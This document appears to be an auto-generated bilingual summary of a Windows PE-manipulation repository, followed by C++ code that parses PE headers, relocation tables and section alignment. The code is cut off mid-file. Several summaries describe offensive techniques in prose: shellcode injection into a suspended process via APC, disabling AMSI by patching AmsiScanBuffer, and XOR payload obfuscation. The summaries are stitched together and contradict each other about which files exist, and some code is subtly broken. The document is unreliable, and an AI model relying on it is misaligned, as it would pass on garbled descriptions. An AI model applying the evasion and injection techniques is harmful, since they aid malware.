# Project Summary

### Summary

**English:**

### 项目描述

#### 项目概述
该项目包含三个主要文件，分别涉及不同的功能：
1. **x32生成.asm兼容x64.cpp**: 该文件主要包含一个简单的C++程序，用于测试一个名为`TestDemo`的函数，并输出其返回值。
2. **代码实现分析重定位表.cpp**: 该文件实现了一个PE文件分析工具，主要功能包括解析PE文件的结构、计算虚拟地址到文件偏移地址的转换、以及分析重定位表。
3. **修正内存对齐的流程.cpp**: 该文件提供了一个函数，用于向文件指定位置追加数据，并修正节表的内存对齐。

#### 详细功能描述

1. **x32生成.asm兼容x64.cpp**:
   - 该文件包含一个简单的C++程序，主要功能是调用一个名为`TestDemo`的函数，并输出其返回值。
   - 程序还包含一个输入操作，用于接收用户输入的整数。
   - 该文件的主要目的是测试和演示一个简单的函数调用和输出操作。

2. **代码实现分析重定位表.cpp**:
   - 该文件实现了一个PE文件分析工具，主要功能包括解析PE文件的结构、计算虚拟地址到文件偏移地址的转换、以及分析重定位表。
   - 主要函数包括：
     - `VaToFoa32`: 将虚拟地址转换为文件偏移地址（FOA）。
     - `getBaseRelocation`: 分析重定位表，输出重定位信息。
   - 程序通过读取指定的PE文件，解析其结构，并输出相关信息，如DOS头、PE头、节表等。
   - 该文件的主要目的是分析PE文件的结构和重定位信息。

3. **修正内存对齐的流程.cpp**:
   - 该文件提供了一个函数`appendFile`，用于向文件指定位置追加数据，并修正节表的内存对齐。
   - 主要功能包括：
     - 向文件指定位置追加数据，并确保文件的完整性。
     - 修正节表的`Misc`和`SizeOfRawData`字段，以确保内存对齐。
   - 该文件的主要目的是提供一个工具，用于修改PE文件的节表，以确保内存对齐。

#### 技术细节
- **PE文件解析**: 项目中使用了Windows API和PE文件结构的相关知识，如`_IMAGE_DOS_HEADER`、`_IMAGE_NT_HEADERS`、`_IMAGE_SECTION_HEADER`等。
- **内存对齐**: 项目中涉及内存对齐的计算，确保PE文件在内存中的布局符合规范。
- **文件操作**: 项目中使用了Windows的文件操作API，如`CreateFileA`、`CreateFileMappingA`、`MapViewOfFile`等，用于读取和修改PE文件。

#### 总结
该项目主要用于分析和修改PE文件的结构，特别是重定位表和节表的内存对齐。通过这些功能，项目可以帮助开发者理解和修改PE文件的内部结构，适用于逆向工程、漏洞分析等场景。

### Project Description

#### **Project Title:** PE File Manipulation and Process Injection

#### **Project Overview:**
This project consists of two main components:
1. **PE File Manipulation:** A program that reads and manipulates Portable Executable (PE) files, specifically focusing on section alignment and memory management.
2. **Process Injection:** A program that performs process injection by injecting shellcode into another process, using techniques such as parameter spoofing and handle de-privileging.

#### **File Descriptions:**

1. **File: PE_Manipulation.cpp**
   - **Purpose:** This file contains code for reading and modifying PE files. It focuses on aligning sections in memory and file, adjusting section sizes, and updating section headers accordingly.
   - **Key Features:**
     - **PE File Reading:** The program opens a PE file, reads its headers, and identifies sections.
     - **Section Alignment:** It calculates the required memory size for sections, aligns them according to the PE header's section alignment value, and adjusts the section headers.
     - **File Writing:** The program writes the modified PE file back to disk, ensuring that the file remains valid and executable.
   - **Main Functions:**
     - `sectionAlignment()`: Aligns sections in memory and file, adjusts section headers, and writes the modified file.
     - `main()`: Initializes the PE file reading process, identifies the architecture (32-bit or 64-bit), and calls `sectionAlignment()` for each section.

2. **File: Parameter_Spoofing.cpp**
   - **Purpose:** This file contains code for process injection using parameter spoofing. It injects shellcode into another process by creating a suspended process, allocating memory in the target process, and writing the shellcode into that memory.
   - **Key Features:**
     - **Shellcode Injection:** The program defines a shellcode payload and injects it into a target process.
     - **Parameter Spoofing:** It uses the `CreateProcessA` function with the `CREATE_SUSPENDED` flag to create a suspended process, allowing the shellcode to be injected before the process starts.
     - **APC Injection:** The program uses `QueueUserAPC` to queue an asynchronous procedure call (APC) that executes the shellcode in the target process.
   - **Main Functions:**
     - `getParentProcessID()`: Retrieves the process ID of the parent process (e.g., `explorer.exe`).
     - `main()`: Initializes the process injection by creating a suspended process, allocating memory, writing the shellcode, and resuming the process.

3. **File: Handle_Deprivileging.cpp**
   - **Purpose:** This file contains a basic structure definition for a linked list node. It is likely incomplete and intended for a different part of the project, possibly related to process management or handle manipulation.
   - **Key Features:**
     - **Linked List Node:** Defines a `ListNode` structure with an integer value and a pointer to the next node.
   - **Main Functions:**
     - None specified in the provided code snippet.

#### **Technologies Used:**
- **Windows API:** Used for file manipulation, process creation, and memory management.
- **PE File Format:** Understanding of the PE file structure is crucial for the PE manipulation component.
- **Shellcode Injection:** Techniques for injecting and executing shellcode in another process.

#### **Potential Use Cases:**
- **PE File Analysis:** Tools for analyzing and modifying PE files, useful for reverse engineering and malware analysis.
- **Process Injection:** Techniques for injecting code into other processes, which can be used for legitimate purposes (e.g., debugging) or malicious activities (e.g., malware).

#### **Conclusion:**
This project demonstrates advanced techniques in PE file manipulation and process injection, showcasing the capabilities of the Windows API and the intricacies of the PE file format. The code provided is a foundation for more complex tools and applications in the fields of reverse engineering, malware analysis, and security research.

### Project Description

This project consists of several C++ and C files, each focusing on different aspects of system-level programming, including linked list manipulation, PE file analysis, AMSI bypass techniques, and more. Below is a summary of each file and its purpose:

#### 1. **Linked List Manipulation (`ListNode.cpp`)**
   - **Purpose**: This file defines a linked list node structure and a function to swap pairs of nodes in the list.
   - **Key Components**:
     - `ListNode` class: Represents a node in a linked list with an integer value and a pointer to the next node.
     - `swapPairs` function: Swaps adjacent pairs of nodes in the linked list.
     - `printList` function: Prints the values of the linked list nodes.
     - `main` function: Contains test cases to demonstrate the `swapPairs` function.

#### 2. **PE File Section Merging (`合并节.cpp`)**
   - **Purpose**: This file contains code to merge sections of a PE (Portable Executable) file.
   - **Key Components**:
     - `combineSection` function: Combines sections of a PE file by aligning their memory sizes and characteristics.
     - Uses Windows-specific structures like `_IMAGE_DOS_HEADER`, `_IMAGE_NT_HEADERS`, and `_IMAGE_SECTION_HEADER`.

#### 3. **AMSI Bypass (`实现amsi绕过.cpp`)**
   - **Purpose**: This file demonstrates a technique to bypass the Antimalware Scan Interface (AMSI) in a Windows environment.
   - **Key Components**:
     - `main` function: Creates a PowerShell process, loads the `amsi.dll` library, and patches the `AmsiScanBuffer` function to disable AMSI scanning.
     - Uses Windows API functions like `CreateProcessA`, `LoadLibraryA`, `GetProcAddress`, `VirtualProtectEx`, and `WriteProcessMemory`.

#### 4. **Export Table (`导出表.cpp`)**
   - **Purpose**: This file is a simple C++ program that prints "Hello World" to the console.
   - **Key Components**:
     - `main` function: Prints "Hello World" using `std::cout`.

#### 5. **BOF Development (`开发一个BOF.c`)**
   - **Purpose**: This file appears to be part of a Beacon Object File (BOF) development, likely for offensive security purposes.
   - **Key Components**:
     - `main` function: Opens a registry key, queries a value, and modifies it.
     - Uses Windows API functions like `RegOpenKeyExA`, `RegQueryValueExA`, and `RegCloseKey`.

#### 6. **XOR and Obfuscation (`异或+混淆.cpp`)**
   - **Purpose**: This file contains functions for converting between hexadecimal and string representations, and for performing XOR operations.
   - **Key Components**:
     - `FromHex` and `ToHex` functions: Convert between hexadecimal strings and byte arrays.
     - `getFileSize1` function: Retrieves the size of a file.
     - `main` function: Demonstrates the use of these functions with a payload file.

#### 7. **Section Expansion (`扩大节.cpp`)**
   - **Purpose**: This file contains code to expand the last section of a PE file.
   - **Key Components**:
     - `expandSection` function: Expands the last section of a PE file by a specified size.
     - Uses Windows API functions like `SetFilePointer`, `WriteFile`, and `ZeroMemory`.
     - `main` function: Demonstrates the expansion of a section in a PE file.

### Summary
The project involves various system-level programming tasks, including linked list manipulation, PE file analysis and modification, AMSI bypass techniques, and more. Each file focuses on a specific aspect of these tasks, demonstrating the use of C++ and C for low-level system operations.

### Project Description

This project consists of several C/C++ source files that demonstrate various aspects of working with Portable Executable (PE) files, ARM emulation, and basic programming tasks. Below is a summary of each file and its purpose:

#### 1. **File: `新增页.cpp`**
   - **Purpose**: This file contains a simple "Hello World" program written in C++.
   - **Key Points**:
     - The program includes the standard input-output library and prints "Hello World" to the console.
     - It is a basic example of a C++ program that can be compiled and run using standard IDE tools.

#### 2. **File: `独角兽写x64 hello world.cpp`**
   - **Purpose**: This file demonstrates ARM emulation using the Unicorn Engine, a lightweight multi-platform, multi-architecture CPU emulator framework.
   - **Key Points**:
     - The program defines an ARM assembly code snippet and uses Unicorn Engine to emulate its execution.
     - It includes a function `add` that reads two parameters from the ARM registers, performs an addition, and returns the result.
     - The main function sets up the emulation environment, maps memory, writes the code to the memory, and hooks the execution to capture specific instructions.
     - The result of the emulated code execution is printed to the console.

#### 3. **File: `自己写程序把 PE 这些结构体都打印出来.c`**
   - **Purpose**: This file is a PE file analyzer that reads and prints various attributes of a PE file, such as its headers and sections.
   - **Key Points**:
     - The program opens a PE file, maps it into memory, and reads its DOS and NT headers.
     - It prints details such as the machine type, number of sections, timestamp, and characteristics of the PE file.
     - The program also includes a function `viewImageFileCharacteristics` that interprets and prints the characteristics flags of the PE file.
     - This is a useful tool for understanding the structure of PE files and can be extended for more detailed analysis.

#### 4. **File: `PE 文件解析.cpp`**
   - **Purpose**: This file is another PE file analyzer that focuses on parsing and printing the headers and sections of a PE file, specifically handling both 32-bit and 64-bit PE files.
   - **Key Points**:
     - The program checks the magic number in the PE header to determine if the file is 32-bit or 64-bit.
     - It dynamically allocates memory for an array of section headers based on the number of sections in the PE file.
     - The program iterates through each section, prints its name, and stores the section headers in the dynamically allocated array.
     - This file demonstrates advanced techniques for parsing PE files and handling different architectures.

### Summary

The project showcases various techniques for working with PE files, including parsing their headers and sections, and demonstrates ARM emulation using the Unicorn Engine. The files provide a mix of basic programming tasks (like printing "Hello World") and more advanced topics like PE file analysis and CPU emulation. Each file serves as a standalone example and can be used as a reference for similar tasks.

**Chinese:**

### 项目描述

#### 项目概述
该项目包含三个主要文件，分别涉及不同的功能：
1. **x32生成.asm兼容x64.cpp**: 该文件主要包含一个简单的C++程序，用于测试一个名为`TestDemo`的函数，并输出其返回值。
2. **代码实现分析重定位表.cpp**: 该文件实现了一个PE文件分析工具，主要功能包括解析PE文件的结构、计算虚拟地址到文件偏移地址的转换、以及分析重定位表。
3. **修正内存对齐的流程.cpp**: 该文件提供了一个函数，用于向文件指定位置追加数据，并修正节表的内存对齐。

#### 详细功能描述

1. **x32生成.asm兼容x64.cpp**:
   - 该文件包含一个简单的C++程序，主要功能是调用一个名为`TestDemo`的函数，并输出其返回值。
   - 程序还包含一个输入操作，用于接收用户输入的整数。
   - 该文件的主要目的是测试和演示一个简单的函数调用和输出操作。

2. **代码实现分析重定位表.cpp**:
   - 该文件实现了一个PE文件分析工具，主要功能包括解析PE文件的结构、计算虚拟地址到文件偏移地址的转换、以及分析重定位表。
   - 主要函数包括：
     - `VaToFoa32`: 将虚拟地址转换为文件偏移地址（FOA）。
     - `getBaseRelocation`: 分析重定位表，输出重定位信息。
   - 程序通过读取指定的PE文件，解析其结构，并输出相关信息，如DOS头、PE头、节表等。
   - 该文件的主要目的是分析PE文件的结构和重定位信息。

3. **修正内存对齐的流程.cpp**:
   - 该文件提供了一个函数`appendFile`，用于向文件指定位置追加数据，并修正节表的内存对齐。
   - 主要功能包括：
     - 向文件指定位置追加数据，并确保文件的完整性。
     - 修正节表的`Misc`和`SizeOfRawData`字段，以确保内存对齐。
   - 该文件的主要目的是提供一个工具，用于修改PE文件的节表，以确保内存对齐。

#### 技术细节
- **PE文件解析**: 项目中使用了Windows API和PE文件结构的相关知识，如`_IMAGE_DOS_HEADER`、`_IMAGE_NT_HEADERS`、`_IMAGE_SECTION_HEADER`等。
- **内存对齐**: 项目中涉及内存对齐的计算，确保PE文件在内存中的布局符合规范。
- **文件操作**: 项目中使用了Windows的文件操作API，如`CreateFileA`、`CreateFileMappingA`、`MapViewOfFile`等，用于读取和修改PE文件。

#### 总结
该项目主要用于分析和修改PE文件的结构，特别是重定位表和节表的内存对齐。通过这些功能，项目可以帮助开发者理解和修改PE文件的内部结构，适用于逆向工程、漏洞分析等场景。

### Content

## File: x32生成.asm兼容x64.cpp

```
﻿#include "stdafx.h"
#include "asm.h"
#include <iostream>
#include < string >
using namespace std;

int _main(int argc, TCHAR* argv[]) {
	int dd;
	int demo = TestDemo();
	std::cout << demo << std::end;
	std::cin >> dd;
	return 0;

}
```

----------------------------------------

## File: 代码实现分析重定位表.cpp

```
﻿// PE.cpp : Defines the entry point for the console application.
//
#include <stdio.h>
#include <malloc.h>
#include <windows.h>
#include <winnt.h>
#include <math.h>
//在VC6这个比较旧的环境里，没有定义64位的这个宏，需要自己定义，在VS2019中无需自己定义
#define IMAGE_FILE_MACHINE_AMD64  0x8664

//VA转FOA 32位
//第一个参数为要转换的在内存中的地址：VA
//第二个参数为指向dos头的指针
//第三个参数为指向nt头的指针
//第四个参数为存储指向节指针的数组
UINT VaToFoa32(UINT va, _IMAGE_DOS_HEADER* dos, _IMAGE_NT_HEADERS* nt, _IMAGE_SECTION_HEADER** sectionArr) {
    //得到RVA的值：RVA = VA - ImageBase
    UINT rva = va - nt->OptionalHeader.ImageBase;
    //输出rva
    //printf("rva:%X\n", rva);
    //找到PE文件头后的地址 = PE文件头首地址+PE文件头大小
    UINT PeEnd = (UINT)dos->e_lfanew + sizeof(_IMAGE_NT_HEADERS);
    //输出PeEnd
    //printf("PeEnd:%X\n", PeEnd);
    //判断rva是否位于PE文件头中
    if (rva < PeEnd) {
        //如果rva位于PE文件头中，则foa==rva，直接返回rva即可
        //printf("foa:%X\n", rva);
        return rva;
    }
    else {
        //如果rva在PE文件头外
        //判断rva属于哪个节
        int i;
        for (i = 0; i < nt->FileHeader.NumberOfSections; i++) {
            //计算内存对齐后节的大小
            UINT SizeInMemory = ceil((double)max((UINT)sectionArr[i]->Misc.VirtualSize, (UINT)sectionArr[i]->SizeOfRawData) / (double)nt->OptionalHeader.SectionAlignment) * nt->OptionalHeader.SectionAlignment;

            if (rva >= sectionArr[i]->VirtualAddress && rva < (sectionArr[i]->VirtualAddress + SizeInMemory)) {
                //找到所属的节
                //输出内存对齐后的节的大小
                //printf("SizeInMemory:%X\n", SizeInMemory);
                break;
            }
        }
        if (i >= nt->FileHeader.NumberOfSections) {
            //未找到
            printf("没有找到匹配的节\n");
            return -1;
        }
        else {
            //计算差值= RVA - 节.VirtualAddress
            UINT offset = rva - sectionArr[i]->VirtualAddress;
            //FOA = 节.PointerToRawData + 差值
            UINT foa = sectionArr[i]->PointerToRawData + offset;
            //printf("foa:%X\n", foa);
            return foa;
        }

    }

}
void getBaseRelocation(_IMAGE_DOS_HEADER* dos, _IMAGE_NT_HEADERS* nt, _IMAGE_SECTION_HEADER** sectionArr) {
    _IMAGE_DATA_DIRECTORY relocateDataDirectory = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    UINT relocateAddress = VaToFoa32(relocateDataDirectory.VirtualAddress + nt->OptionalHeader.ImageBase, dos, nt, sectionArr);
    _IMAGE_BASE_RELOCATION* relocateDirectory = (_IMAGE_BASE_RELOCATION*)((UINT)dos + relocateAddress);
    int cnt = 0;
    while (true) {
        //判断是否到达结尾
        if (relocateDirectory->VirtualAddress != 0 && relocateDirectory->SizeOfBlock != 0) {
            int num = (relocateDirectory->SizeOfBlock - 8) / 2;
            int i;
            for (i = 0; i < num - 1; i++) {
                WORD* offset = (WORD*)((UINT)relocateDirectory + 8 + 2 * i);
                //高四位为0011即3
                if (*offset >= 0x3000) {
                    printf("base:%X\toffset:%X\n", relocateDirectory->VirtualAddress, *offset - 0x3000);
                }

            }
            relocateDirectory = (_IMAGE_BASE_RELOCATION*)((UINT)relocateDirectory + relocateDirectory->SizeOfBlock);
            cnt++;

        }
        else {
            break;
        }
    }
    printf("%d\n", cnt);
}
int main(int argc, char* argv[])
{
    //创建DOS对应的结构体指针
    _IMAGE_DOS_HEADER* dos;
    //读取文件，返回文件句柄
    HANDLE hFile = CreateFileA("C:\\Users\\lyl610abc\\Desktop\\EverEdit\\EverEdit.exe", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, 0);
    //根据文件句柄创建映射
    HANDLE hMap = CreateFileMappingA(hFile, NULL, PAGE_READWRITE, 0, 0, 0);
    //映射内容
    LPVOID pFile = MapViewOfFile(hMap, FILE_SHARE_WRITE, 0, 0, 0);
    //类型转换，用结构体的方式来读取
    dos = (_IMAGE_DOS_HEADER*)pFile;
    //输出dos->e_magic，以十六进制输出
    printf("dos->e_magic:%X\n", dos->e_magic);

    //创建指向PE文件头标志的指针
    DWORD* peId;
    //让PE文件头标志指针指向其对应的地址=DOS首地址+偏移
    peId = (DWORD*)((UINT)dos + dos->e_lfanew);
    //输出PE文件头标志，其值应为4550，否则不是PE文件
    printf("peId:%X\n", *peId);

    //创建指向可选PE头的第一个成员magic的指针
    WORD* magic;
    //让magic指针指向其对应的地址=PE文件头标志地址+PE文件头标志大小+标准PE头大小
    magic = (WORD*)((UINT)peId + sizeof(DWORD) + sizeof(_IMAGE_FILE_HEADER));
    //输出magic，其值为0x10b代表32位程序，其值为0x20b代表64位程序
    printf("magic:%X\n", *magic);
    //根据magic判断为32位程序还是64位程序
    switch (*magic) {
    case IMAGE_NT_OPTIONAL_HDR32_MAGIC:
    {
        printf("32位程序\n");
        //确定为32位程序后，就可以使用_IMAGE_NT_HEADERS来接收数据了
        //创建指向PE文件头的指针
        _IMAGE_NT_HEADERS* nt;
        //让PE文件头指针指向其对应的地址
        nt = (_IMAGE_NT_HEADERS*)peId;
        printf("Machine:%X\n", nt->FileHeader.Machine);
        printf("Magic:%X\n", nt->OptionalHeader.Magic);
        //创建一个指针数组，该指针数组用来存储所有的节表指针
        //这里相当于_IMAGE_SECTION_HEADER* sectionArr[nt->FileHeader.NumberOfSections],声明了一个动态数组
        _IMAGE_SECTION_HEADER** sectionArr = (_IMAGE_SECTION_HEADER**)malloc(sizeof(_IMAGE_SECTION_HEADER*) * nt->FileHeader.NumberOfSections);

        //创建指向块表的指针
        _IMAGE_SECTION_HEADER* sectionHeader;
        //让块表的指针指向其对应的地址
        sectionHeader = (_IMAGE_SECTION_HEADER*)((UINT)nt + sizeof(_IMAGE_NT_HEADERS));
        //计数，用来计算块表地址
        int cnt = 0;
        //比较 计数 和 块表的个数，即遍历所有块表
        while (cnt < nt->FileHeader.NumberOfSections) {
            //创建指向块表的指针
            _IMAGE_SECTION_HEADER* section;
            //让块表的指针指向其对应的地址=第一个块表地址+计数*块表的大小
            section = (_IMAGE_SECTION_HEADER*)((UINT)sectionHeader + sizeof(_IMAGE_SECTION_HEADER) * cnt);
            //将得到的块表指针存入数组
            sectionArr[cnt++] = section;
            //输出块表名称
            printf("%s\n", section->Name);
        }

        getBaseRelocation(dos, nt, sectionArr);

        break;
    }

    case IMAGE_NT_OPTIONAL_HDR64_MAGIC:
    {
        printf("64位程序\n");
        //确定为64位程序后，就可以使用_IMAGE_NT_HEADERS64来接收数据了
        //创建指向PE文件头的指针
        _IMAGE_NT_HEADERS64* nt;
        nt = (_IMAGE_NT_HEADERS64*)peId;
        printf("Machine:%X\n", nt->FileHeader.Machine);
        printf("Magic:%X\n", nt->OptionalHeader.Magic);

        //创建一个指针数组，该指针数组用来存储所有的节表指针
        //这里相当于_IMAGE_SECTION_HEADER* sectionArr[nt->FileHeader.NumberOfSections],声明了一个动态数组
        _IMAGE_SECTION_HEADER** sectionArr = (_IMAGE_SECTION_HEADER**)malloc(sizeof(_IMAGE_SECTION_HEADER*) * nt->FileHeader.NumberOfSections);

        //创建指向块表的指针
        _IMAGE_SECTION_HEADER* sectionHeader;
        //让块表的指针指向其对应的地址，区别在于这里加上的偏移为_IMAGE_NT_HEADERS64
        sectionHeader = (_IMAGE_SECTION_HEADER*)((UINT)nt + sizeof(_IMAGE_NT_HEADERS64));
        //计数，用来计算块表地址
        int cnt = 0;
        //比较 计数 和 块表的个数，即遍历所有块表
        while (cnt < nt->FileHeader.NumberOfSections) {
            //创建指向块表的指针
            _IMAGE_SECTION_HEADER* section;
            //让块表的指针指向其对应的地址=第一个块表地址+计数*块表的大小
            section = (_IMAGE_SECTION_HEADER*)((UINT)sectionHeader + sizeof(_IMAGE_SECTION_HEADER) * cnt);
            //将得到的块表指针存入数组
            sectionArr[cnt++] = section;
            //输出块表名称
            printf("%s\n", section->Name);
        }

        break;
    }

    default:
    {
        printf("error!\n");
        break;
    }

    }
    return 0;
}
```

----------------------------------------

## File: 修正内存对齐的流程.cpp

```
﻿#include <stdio.h>
#include <malloc.h>
#include <windows.h>
#include <winnt.h>
#include <math.h>
//在VC6这个比较旧的环境里，没有定义64位的这个宏，需要自己定义，在VS2019中无需自己定义
#define IMAGE_FILE_MACHINE_AMD64  0x8664

//向文件中指定位置追加数据
//第一个参数为文件路径
//第二个参数为要追加的数据指针
//第三个参数为要追加的数据大小
//第四个参数为位置偏移
//第五个参数为hMap的指针
//第六个参数为pFile的指针
BOOL appendFile(LPCSTR filePath, PVOID writeData, DWORD sizeOfWriteData, DWORD offset, HANDLE* phMap, PVOID* ppFile) {
    HANDLE hFile = CreateFileA(filePath, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, 0);
    char newPath[100];
    strcpy(newPath, filePath);

    strcat(newPath, ".exe");
    HANDLE hFile2 = CreateFileA(newPath, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_WRITE, NULL, OPEN_ALWAYS, 0, 0);

    //WriteFile用于接收实际写入的大小的参数
    DWORD dwWritenSize = 0;

    //根据文件句柄创建映射
    HANDLE hMap = CreateFileMappingA(hFile, NULL, PAGE_READWRITE, 0, 0, 0);
    //映射内容
    LPVOID pFile = MapViewOfFile(hMap, FILE_SHARE_WRITE, 0, 0, 0);

    BYTE* content = (BYTE*)pFile;
    content += offset;

    //写入要插入数据前的数据
    DWORD size = SetFilePointer(hFile, NULL, NULL, FILE_END);
    BOOL bRet;
    bRet = WriteFile(hFile2, pFile, offset, &dwWritenSize, NULL);
    if (!bRet)return false;
    //写入要插入的数据
    SetFilePointer(hFile, NULL, NULL, FILE_END);
    bRet = WriteFile(hFile2, writeData, sizeOfWriteData, &dwWritenSize, NULL);
    if (!bRet)return false;
    //写入要插入数据后的数据
    SetFilePointer(hFile, NULL, NULL, FILE_END);
    bRet = WriteFile(hFile2, content, size - offset, &dwWritenSize, NULL);
    if (!bRet)return false;
    //在删除文件前要先关闭句柄和映射
    CloseHandle(hFile);
    CloseHandle(hMap);
    CloseHandle(*phMap);
    UnmapViewOfFile(pFile);
    UnmapViewOfFile(*ppFile);
    bRet = DeleteFileA(filePath);
    if (!bRet)return false;

    hFile = CreateFileA(filePath, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_WRITE, NULL, OPEN_ALWAYS, 0, 0);
    //根据文件句柄创建映射
    hMap = CreateFileMappingA(hFile2, NULL, PAGE_READWRITE, 0, 0, 0);
    //映射内容
    pFile = MapViewOfFile(hMap, FILE_SHARE_WRITE, 0, 0, 0);
    SetFilePointer(hFile, NULL, NULL, FILE_BEGIN);
    bRet = WriteFile(hFile, pFile, sizeOfWriteData + size, &dwWritenSize, NULL);
    if (!bRet)return false;
    //在删除文件前要先关闭句柄和映射
    CloseHandle(hFile);
    CloseHandle(hFile2);
    CloseHandle(hMap);
    UnmapViewOfFile(pFile);
    bRet = DeleteFileA(newPath);
    if (!bRet)return false;
    hFile = CreateFileA(filePath, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_WRITE, NULL, OPEN_ALWAYS, 0, 0);
    //根据文件句柄创建映射
    hMap = CreateFileMappingA(hFile, NULL, PAGE_READWRITE, 0, 0, 0);
    //映射内容
    *ppFile = MapViewOfFile(hMap, FILE_SHARE_WRITE, 0, 0, 0);
    *phMap = hMap;
    CloseHandle(hFile);
    return true;
}
//根据pFile获取PE文件结构
void GetPeStruct32(LPVOID pFile, _IMAGE_DOS_HEADER* dos, _IMAGE_NT_HEADERS* nt, _IMAGE_SECTION_HEADER** sectionArr) {
    dos = (_IMAGE_DOS_HEADER*)pFile;

    //创建指向PE文件头标志的指针
    DWORD* peId;
    //让PE文件头标志指针指向其对应的地址=DOS首地址+偏移
    peId = (DWORD*)((UINT)dos + dos->e_lfanew);

    //创建指向可选PE头的第一个成员magic的指针
    WORD* magic;
    //让magic指针指向其对应的地址=PE文件头标志地址+PE文件头标志大小+标准PE头大小
    magic = (WORD*)((UINT)peId + sizeof(DWORD) + sizeof(_IMAGE_FILE_HEADER));

    //根据magic判断为32位程序还是64位程序

    //让PE文件头指针指向其对应的地址
    nt = (_IMAGE_NT_HEADERS*)peId;

    //创建指向块表的指针
    _IMAGE_SECTION_HEADER* sectionHeader;
    //让块表的指针指向其对应的地址
    sectionHeader = (_IMAGE_SECTION_HEADER*)((UINT)nt + sizeof(_IMAGE_NT_HEADERS));
    //计数，用来计算块表地址
    int cnt = 0;
    //比较 计数 和 块表的个数，即遍历所有块表
    while (cnt < nt->FileHeader.NumberOfSections) {
        //创建指向块表的指针
        _IMAGE_SECTION_HEADER* section;
        //让块表的指针指向其对应的地址=第一个块表地址+计数*块表的大小
        section = (_IMAGE_SECTION_HEADER*)((UINT)sectionHeader + sizeof(_IMAGE_SECTION_HEADER) * cnt);
        //将得到的块表指针存入数组
        sectionArr[cnt++] = section;

    }
}

//修正节表的Misc和SizeOfRawData
//第一个参数为指向dos头的指针
//第二个参数为指向nt头的指针
//第三个参数为存储指向节指针的数组
//第四个参数为文件路径
//第五个参数为文件映射
//第六个参数为文件映射内容指针
//第七个参数为要修正的节表在数组中的下标
void sectionAlignment(_IMAGE_DOS_HEADER* dos, _IMAGE_NT_HEADERS* nt, _IMAGE_SECTION_HEADER** sectionArr, LPCSTR filePath, HANDLE* phMap, LPVOID* ppFile, int n) {

    //获得最后一个节的实际大小
    DWORD VirtualSize = sectionArr[n]->Misc.VirtualSize;
    //获得最后一个节的文件对齐后的大小
    DWORD SizeOfRawData = sectionArr[n]->SizeOfRawData;
    //计算上一个节内存对齐后的大小
    UINT SizeInMemory = (UINT)ceil((double)max(VirtualSize, SizeOfRawData) / (double)nt->OptionalHeader.SectionAlignment) * nt->OptionalHeader.SectionAlignment;
    printf("%X\n", SizeInMemory);
    //计算差值= 内存对齐后大小 - 文件对齐后大小
    UINT offset = SizeInMemory - sectionArr[n]->SizeOfRawData;
    printf("%X\n", offset);
    //根据节在文件中的偏移 + 文件对齐后的大小 得到节的末尾
    UINT end = sectionArr[n]->PointerToRawData + sectionArr[n]->SizeOfRawData;
    printf("end:%X\n", end);

    //申请要填充的空间
    INT* content = (INT*)malloc(offset);
    //初始化为0
    ZeroMemory(content, offset);
    //WriteFile用于接收实际写入的大小的参数
    DWORD dwWritenSize = 0;

    BOOL bRet = appendFile(filePath, (PVOID)content, offset, end, phMap, ppFile);
    GetPeStruct32(*ppFile, dos, nt, sectionArr);
    if (bRet) {
        //开始修正Misc和SizeOfRawData
        sectionArr[n]->Misc.VirtualSize = SizeInMemory;
        sectionArr[n]->SizeOfRawData = SizeInMemory;
        //修正后面受到影响的节的PointerOfRawData和VirtualAddress
        int i;
        while (n + 1 <= nt->FileHeader.NumberOfSections - 1) {
            n++;
            sectionArr[n]->PointerToRawData += offset;
        }
    }

}

int main(int argc, char* argv[])
{
    //创建DOS对应的结构体指针
    _IMAGE_DOS_HEADER* dos;
    //读取文件，返回文件句柄
    HANDLE hFile = CreateFileA("C:\\Users\\lyl610abc\\Desktop\\EverEdit\\EverEdit.exe", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, 0);
    //根据文件句柄创建映射
    HANDLE hMap = CreateFileMappingA(hFile, NULL, PAGE_READWRITE, 0, 0, 0);
    //映射内容
    LPVOID pFile = MapViewOfFile(hMap, FILE_SHARE_WRITE, 0, 0, 0);
    //类型转换，用结构体的方式来读取
    dos = (_IMAGE_DOS_HEADER*)pFile;
    //输出dos->e_magic，以十六进制输出
    printf("dos->e_magic:%X\n", dos->e_magic);

    //创建指向PE文件头标志的指针
    DWORD* peId;
    //让PE文件头标志指针指向其对应的地址=DOS首地址+偏移
    peId = (DWORD*)((UINT)dos + dos->e_lfanew);
    //输出PE文件头标志，其值应为4550，否则不是PE文件
    printf("peId:%X\n", *peId);

    //创建指向可选PE头的第一个成员magic的指针
    WORD* magic;
    //让magic指针指向其对应的地址=PE文件头标志地址+PE文件头标志大小+标准PE头大小
    magic = (WORD*)((UINT)peId + sizeof(DWORD) + sizeof(_IMAGE_FILE_HEADER));
    //输出magic，其值为0x10b代表32位程序，其值为0x20b代表64位程序
    printf("magic:%X\n", *magic);
    //根据magic判断为32位程序还是64位程序
    switch (*magic) {
    case IMAGE_NT_OPTIONAL_HDR32_MAGIC:
    {
        printf("32位程序\n");
        //确定为32位程序后，就可以使用_IMAGE_NT_HEADERS来接收数据了
        //创建指向PE文件头的指针
        _IMAGE_NT_HEADERS* nt;
        //让PE文件头指针指向其对应的地址
        nt = (_IMAGE_NT_HEADERS*)peId;
        printf("Machine:%X\n", nt->FileHeader.Machine);
        printf("Magic:%X\n", nt->OptionalHeader.Magic);
        //创建一个指针数组，该指针数组用来存储所有的节表指针
        //这里相当于_IMAGE_SECTION_HEADER* sectionArr[nt->FileHeader.NumberOfSections],声明了一个动态数组
        _IMAGE_SECTION_HEADER** sectionArr = (_IMAGE_SECTION_HEADER**)malloc(sizeof(_IMAGE_SECTION_HEADER*) * nt->FileHeader.NumberOfSections);

        //创建指向块表的指针
        _IMAGE_SECTION_HEADER* sectionHeader;
        //让块表的指针指向其对应的地址
        sectionHeader = (_IMAGE_SECTION_HEADER*)((UINT)nt + sizeof(_IMAGE_NT_HEADERS));
        //计数，用来计算块表地址
        int cnt = 0;
        //比较 计数 和 块表的个数，即遍历所有块表
        while (cnt < nt->FileHeader.NumberOfSections) {
            //创建指向块表的指针
